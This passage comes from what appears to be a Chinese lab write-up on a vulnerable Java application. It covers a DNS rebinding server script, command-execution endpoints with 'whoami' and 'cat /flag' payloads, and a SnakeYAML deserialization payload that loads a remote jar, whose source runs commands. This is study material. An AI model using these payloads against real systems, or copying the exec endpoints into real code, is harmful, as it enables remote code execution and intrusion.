localhost）</span></pre></td></tr><tr><td data-num="13"></td><td><pre>TTL <span class="token operator">=</span> <span class="token number">1</span>                        <span class="token comment"># TTL 设置为 1 秒</span></pre></td></tr><tr><td data-num="14"></td><td><pre>SWITCH_DELAY <span class="token operator">=</span> <span class="token number">10</span>             <span class="token comment"># 多少秒后进行切换</span></pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token keyword">class</span> <span class="token class-name">RebindResolver</span><span class="token punctuation">(</span>BaseResolver<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token keyword">def</span> <span class="token function">resolve</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> request<span class="token punctuation">,</span> handler<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        qname <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>q<span class="token punctuation">.</span>qname<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="19"></td><td><pre>        now <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre></pre></td></tr><tr><td data-num="21"></td><td><pre>        <span class="token keyword">if</span> qname<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span>RECORD_DOMAIN<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="22"></td><td><pre>            <span class="token keyword">if</span> qname <span class="token keyword">not</span> <span class="token keyword">in</span> visit_log<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="23"></td><td><pre>                visit_log<span class="token punctuation">[</span>qname<span class="token punctuation">]</span> <span class="token operator">=</span> now</pre></td></tr><tr><td data-num="24"></td><td><pre></pre></td></tr><tr><td data-num="25"></td><td><pre>            elapsed <span class="token operator">=</span> now <span class="token operator">-</span> visit_log<span class="token punctuation">[</span>qname<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="26"></td><td><pre>            ip <span class="token operator">=</span> IP1 <span class="token keyword">if</span> elapsed <span class="token operator">&lt;</span> SWITCH_DELAY <span class="token keyword">else</span> IP2</pre></td></tr><tr><td data-num="27"></td><td><pre>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] Responding </span><span class="token interpolation"><span class="token punctuation">&#123;</span>qname<span class="token punctuation">&#125;</span></span><span class="token string"> with </span><span class="token interpolation"><span class="token punctuation">&#123;</span>ip<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="28"></td><td><pre></pre></td></tr><tr><td data-num="29"></td><td><pre>            reply <span class="token operator">=</span> request<span class="token punctuation">.</span>reply<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="30"></td><td><pre>            reply<span class="token punctuation">.</span>add_answer<span class="token punctuation">(</span>RR<span class="token punctuation">(</span>qname<span class="token punctuation">,</span> QTYPE<span class="token punctuation">.</span>A<span class="token punctuation">,</span> rdata<span class="token operator">=</span>A<span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">,</span> ttl<span class="token operator">=</span>TTL<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="31"></td><td><pre>            <span class="token keyword">return</span> reply</pre></td></tr><tr><td data-num="32"></td><td><pre>        <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="33"></td><td><pre>            <span class="token keyword">return</span> request<span class="token punctuation">.</span>reply<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="34"></td><td><pre></pre></td></tr><tr><td data-num="35"></td><td><pre><span class="token comment"># 启动服务</span></pre></td></tr><tr><td data-num="36"></td><td><pre><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="37"></td><td><pre>    resolver <span class="token operator">=</span> RebindResolver<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="38"></td><td><pre>    server <span class="token operator">=</span> DNSServer<span class="token punctuation">(</span>resolver<span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">5353</span><span class="token punctuation">,</span> address<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> tcp<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="39"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] DNS server running at UDP :5353 ..."</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="40"></td><td><pre>    server<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>启动：</p>
<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">sudo</span> python3 <span class="token number">1</span>.py</pre></td></tr></table></figure><p>测试：</p>
<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>模拟请求：</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">dig</span> @127.0.0.1 <span class="token parameter variable">-p</span> <span class="token number">5353</span> rebind.test（1.2.3.4）</pre></td></tr><tr><td data-num="3"></td><td><pre>过十秒---》</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token function">dig</span> @127.0.0.1 <span class="token parameter variable">-p</span> <span class="token number">5353</span> rebind.test（127.0.0.1）</pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token function">dig</span> @127.0.0.1 <span class="token parameter variable">-p</span> <span class="token number">5353</span> rebind.test（127.0.0.1）</pre></td></tr></table></figure><p>第一次：</p>
<p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202507091551409.png" alt="image-20250709155108028" /></p>
<p>第二三次：</p>
<p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202507091551412.png" alt="image-20250709155138082" /></p>
<h4 id="防御思路"><a class="anchor" href="#防御思路">#</a> 防御思路</h4>
<p><strong>局限性:</strong></p>
<ol>
<li>
<p>时间窗口问题</p>
<blockquote>
<p>DNS 缓存的问题。即使我们在前面实现的时候设置了 TTL 为 0，但是有些公共 DNS 服务器，比如 114.114.114.114 还是会把记录进行缓存，完全不按照标准协议来，遇到这种情况是无解的。但是 8.8.8.8 是严格按照 DNS 协议去管理缓存的，如果设置 TTL 为 0，则不会进行缓存。</p>
</blockquote>
</li>
<li>
<p>DNS 缓存机制</p>
<blockquote>
<p>Linux dns 默认不缓存，windows and mac, 为了加快 http 访问速度，系统会进行 DNS 缓存</p>
</blockquote>
</li>
<li>
<p>应用环境问题</p>
<blockquote>
<p>(1) java 默认失败</p>
<p>Java 应用的默认 TTL 为 10s，这个默认配置会导致 DNS Rebinding 绕过失败</p>
<p>测试的时候可以修改配置:</p>
<pre><code>java.security.Security.setProperty(&quot;networkaddress.cache.negative.ttl&quot; , &quot;0&quot;);
</code></pre>
<p>(2) PHP 默认 TTL 为 0, 可以攻击</p>
</blockquote>
</li>
</ol>
<p>其实这个漏洞局限性还是很大的，但是如果能确认发起 DNS 请求，针对性大量请求还是能提高命中的概率。</p>
<p>那么这种攻击有什么办法解决呢？</p>
<p>小弟就来丢一个完美的解决的方案？</p>
<blockquote>
<p>原理:</p>
<p>通过控制 2 次的 DNS 查询请求的间隔低于 TTL 值，确保两次查询的结果一致。</p>
<p>技术实现:</p>
<p>所以代码写一个请求判断，Linux 系统修改默认的 TTL 值为 10, 即可很轻松解决这个问题。</p>
</blockquote>
<h2 id="rce"><a class="anchor" href="#rce">#</a> rce</h2>
<h3 id="1路由rceruntimeexec"><a class="anchor" href="#1路由rceruntimeexec">#</a> 1. 路由 /rce/runtime/exec</h3>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/runtime/exec"</span><span class="token punctuation">)</span>  </pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token class-name">CommandExec</span><span class="token punctuation">(</span><span class="token class-name">String</span> cmd<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  </pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token class-name">Runtime</span> run <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  </pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token class-name">StringBuilder</span> sb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  </pre></td></tr><tr><td data-num="5"></td><td><pre>  </pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">try</span> <span class="token punctuation">&#123;</span>  </pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token class-name">Process</span> p <span class="token operator">=</span> run<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>  </pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token class-name">BufferedInputStream</span> in <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedInputStream</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  </pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token class-name">BufferedReader</span> inBr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedReader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">InputStreamReader</span><span class="token punctuation">(</span>in<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  </pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token class-name">String</span> tmpStr<span class="token punctuation">;</span>  </pre></td></tr><tr><td data-num="11"></td><td><pre>  </pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>tmpStr <span class="token operator">=</span> inBr<span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  </pre></td></tr><tr><td data-num="13"></td><td><pre>sb<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>tmpStr<span class="token punctuation">)</span><span class="token punctuation">;</span>  </pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">&#125;</span>  </pre></td></tr><tr><td data-num="15"></td><td><pre>  </pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token keyword">if</span> <span class="token punctuation">(</span>p<span class="token punctuation">.</span><span class="token function">waitFor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  </pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token keyword">if</span> <span class="token punctuation">(</span>p<span class="token punctuation">.</span><span class="token function">exitValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>  </pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token keyword">return</span> <span class="token string">"Command exec failed!!"</span><span class="token punctuation">;</span>  </pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token punctuation">&#125;</span>  </pre></td></tr><tr><td data-num="20"></td><td><pre>  </pre></td></tr><tr><td data-num="21"></td><td><pre>inBr<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  </pre></td></tr><tr><td data-num="22"></td><td><pre>in<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  </pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  </pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token keyword">return</span> e<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  </pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token punctuation">&#125;</span>  </pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token keyword">return</span> sb<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  </pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>payload：cmd=whoami</p>
<h3 id="2路由rceprocessbuilder"><a class="anchor" href="#2路由rceprocessbuilder">#</a> 2. 路由 /rce/processBuilder</h3>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/ProcessBuilder"</span><span class="token punctuation">)</span>  </pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">processBuilder</span><span class="token punctuation">(</span><span class="token class-name">String</span> cmd<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  </pre></td></tr><tr><td data-num="3"></td><td><pre>  </pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token class-name">StringBuilder</span> sb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  </pre></td></tr><tr><td data-num="5"></td><td><pre>  </pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">try</span> <span class="token punctuation">&#123;</span>  </pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arrCmd <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> <span class="token string">"-c"</span><span class="token punctuation">,</span> cmd<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  </pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token class-name">ProcessBuilder</span> processBuilder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ProcessBuilder</span><span class="token punctuation">(</span>arrCmd<span class="token punctuation">)</span><span class="token punctuation">;</span>  </pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token class-name">Process</span> p <span class="token operator">=</span> processBuilder<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  </pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token class-name">BufferedInputStream</span> in <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedInputStream</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  </pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token class-name">BufferedReader</span> inBr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedReader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">InputStreamReader</span><span class="token punctuation">(</span>in<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  </pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token class-name">String</span> tmpStr<span class="token punctuation">;</span>  </pre></td></tr><tr><td data-num="13"></td><td><pre>  </pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>tmpStr <span class="token operator">=</span> inBr<span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  </pre></td></tr><tr><td data-num="15"></td><td><pre>sb<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>tmpStr<span class="token punctuation">)</span><span class="token punctuation">;</span>  </pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token punctuation">&#125;</span>  </pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  </pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token keyword">return</span> e<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  </pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token punctuation">&#125;</span>  </pre></td></tr><tr><td data-num="20"></td><td><pre>  </pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token keyword">return</span> sb<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  </pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>cmd=whoami</p>
<h3 id="3路由rcejscmd"><a class="anchor" href="#3路由rcejscmd">#</a> 3. 路由 /rce/jscmd</h3>
<p>js 文件：</p>
<figure class="highlight js"><figcaption data-lang="JavaScript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">try</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token comment">// 导入 Java 的 Runtime 和 Scanner 类</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token keyword">var</span> Runtime <span class="token operator">=</span> Java<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token keyword">var</span> Scanner <span class="token operator">=</span> Java<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">"java.util.Scanner"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token comment">// 要执行的命令，这里用 whoami 方便查看当前用户</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">var</span> cmd <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"cat"</span><span class="token punctuation">,</span><span class="token string">"/flag"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">// 可以通过这样的方式 cat /flag// 不能直接在一个字符串中，得隔开</span></pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token comment">// 执行命令</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">var</span> proc <span class="token operator">=</span> Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token comment">// 等待命令执行完成</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    proc<span class="token punctuation">.</span><span class="token function">waitFor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token comment">// 读取命令的标准输出流</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token keyword">var</span> s <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scanner</span><span class="token punctuation">(</span>proc<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">useDelimiter</span><span class="token punctuation">(</span><span class="token string">"\\A"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token keyword">var</span> output <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">?</span> s<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token string">"no output"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token comment">// 打印结果到服务器控制台（Nashorn 的 print）</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"Command output: "</span> <span class="token operator">+</span> output<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token comment">// 出现异常时打印错误信息</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"Error executing command: "</span> <span class="token operator">+</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/jscmd"</span><span class="token punctuation">)</span>  </pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">jsEngine</span><span class="token punctuation">(</span><span class="token class-name">String</span> jsurl<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>  </pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">// js nashorn javascript ecmascript  </span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token class-name">ScriptEngine</span> engine <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ScriptEngineManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getEngineByName</span><span class="token punctuation">(</span><span class="token string">"js"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  </pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token class-name">Bindings</span> bindings <span class="token operator">=</span> engine<span class="token punctuation">.</span><span class="token function">getBindings</span><span class="token punctuation">(</span><span class="token class-name">ScriptContext</span><span class="token punctuation">.</span><span class="token constant">ENGINE_SCOPE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  </pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token class-name">String</span> cmd <span class="token operator">=</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"load(\"%s\")"</span><span class="token punctuation">,</span> jsurl<span class="token punctuation">)</span><span class="token punctuation">;</span>  </pre></td></tr><tr><td data-num="7"></td><td><pre>engine<span class="token punctuation">.</span><span class="token function">eval</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> bindings<span class="token punctuation">)</span><span class="token punctuation">;</span>  </pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h4 id="image-20250710111939201"><a class="anchor" href="#image-20250710111939201">#</a> <img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202507101119434.png" alt="image-20250710111939201" /></h4>
<p>也是可以了</p>
<h3 id="4路由rcevulnyarm"><a class="anchor" href="#4路由rcevulnyarm">#</a> 4. 路由 /rce/vuln/yarm</h3>
<p>源码代码：</p>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/vuln/yarm"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">yarm</span><span class="token punctuation">(</span><span class="token class-name">String</span> content<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>        <span class="token class-name">Yaml</span> y <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Yaml</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>        <span class="token comment">//</span></pre></td></tr><tr><td data-num="5"></td><td><pre>        y<span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>该代码利用 SnakeYAML 存在的反序列化漏洞来 rce，在解析恶意 yml 内容时会完成指定的动作，实现命令执行。我们所加载的 yaml 文件如下：</p>
<figure class="highlight yaml"><figcaption data-lang="YAML"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token tag">!!javax.script.ScriptEngineManager</span> <span class="token punctuation">[</span></pre></td></tr><tr><td data-num="2"></td><td><pre>  <span class="token tag">!!java.net.URLClassLoader</span> <span class="token punctuation">[</span><span class="token punctuation">[</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token tag">!!java.net.URL</span> <span class="token punctuation">[</span><span class="token string">"http://127.0.0.1/yaml-payload.jar"</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="4"></td><td><pre>  <span class="token punctuation">]</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">]</span></pre></td></tr></table></figure><p>jar 是我们远程加载的恶意文件，其源码如下：</p>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">package</span> <span class="token namespace">artsploit</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>script<span class="token punctuation">.</span></span><span class="token class-name">ScriptEngine</span></span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>script<span class="token punctuation">.</span></span><span class="token class-name">ScriptEngineFactory</span></span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span></span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AwesomeScriptEngineFactory</span> <span class="token keyword">implements</span> <span class="token class-name">ScriptEngineFactory</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">public</span> <span class="token class-name">AwesomeScriptEngineFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>            <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"whoami"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>            <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc.exe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token 